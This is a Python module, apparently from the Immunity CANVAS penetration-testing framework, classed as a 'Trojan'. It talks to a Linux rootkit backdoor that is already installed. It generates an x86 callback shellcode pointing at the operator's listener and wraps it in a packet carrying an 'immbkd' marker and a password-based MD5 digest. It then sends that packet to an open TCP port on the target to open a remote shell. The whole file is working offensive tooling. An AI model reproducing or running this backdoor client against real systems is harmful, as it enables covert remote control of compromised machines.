#! /usr/bin/env python
# Proprietary CANVAS source code - use only under the license agreement
# specified in LICENSE.txt in your CANVAS distribution
# Copyright Immunity, Inc, 2002-2008
# http://www.immunityinc.com/CANVAS/ for more information

import sys
if "." not in sys.path: 
    sys.path.append(".")
##import md5    
import hashlib
import socket
import struct

from canvasexploit import canvasexploit
from ExploitTypes.localcommand import LocalCommand
import shellcodeGenerator

NAME            = "Inject code into linux rootkit"
DESCRIPTION     = "Interacts with linux rootkit"
DOCUMENTATION   = {}
DOCUMENTATION["Notes"]=""" 
1. Once the module is loaded you can inject code through any open TCP port.
2. This module will inject a mosdef shell.
3. If you want to inject any other code, copy and modify this code, use the README.
"""
# properties
PROPERTY={}
PROPERTY['TYPE'] = "Trojans"
PROPERTY['ARCH'] = [ ["Linux"] ]
VERSION="1.0"

class theexploit(LocalCommand):
    def __init__(self):
        """ init """
        
        LocalCommand.__init__(self)
        self.result     = ""
        self.name       = NAME
        self.port       = 80
        self.passwd     = ""
        self.host       = ""
        self.results    = ""
        
        self.supportedNodeArgs=[["linuxNode"]]
        return
    
    def neededListenerTypes(self):
        from canvasengine import LINUXMOSDEF
        return [LINUXMOSDEF]
           
    def getArgs(self):
        """ get arguments """

        self.host   = self.target.interface
        self.passwd = self.argsDict.get("passwd",self.passwd)

        try:
            self.port = int(self.argsDict.get("injectPort", self.port))
        except:
            pass
        return
    
    def injectMosdef(self, node):
        #first generate our callback shellcode        

        sc = shellcodeGenerator.linux_X86()
        sc.addAttr('mmap_callback', {'host' : self.callback.ip, 'port' :self.callback.port})
        shellcode   = sc.get()
        packet      = ""
        packet      += "immbkd"
        #do md5 calculation
        ##m           = md5.new()
        m           = hashlib.md5()
        n           = self.passwd + shellcode
   
        print("Dumping string before MD5")
        for c in n:
            print "%#x" % ord(c),
        print("\n*****************************\n")
        
        m.update(n);
        print(self.passwd)
        print(m.hexdigest())
        packet += m.digest()
        packet += struct.pack("<L", len(shellcode))
        packet += shellcode
        for c in packet:
            print "%#02x" % ord(c),
        print("\n\n");
        #Debug
        s = self.gettcpsock()
        self.log("Injecting packet on %s port %d"%(self.host, self.port))
        try:
            s.connect((self.host, self.port))
        except socket.error:
            self.log("No connection...")
            return 0
        s.send(packet)

        s.close()

        return 1
    
    def interactWithNode(self, node):
        """  """
        # cross platform support in the future
        ret     = 0
        type    = node.nodetype
        self.injectMosdef(node)
        return ret
            
    def run(self):
        """ main """

        self.setInfo("%s (in progress)"%(NAME))
        self.getArgs()
                        
        for node in self.argsDict["passednodes"]:
            ret = self.interactWithNode(node)
        return 1

if __name__=="__main__":
    print "[*] This module is designed to be run from inside of CANVAS."

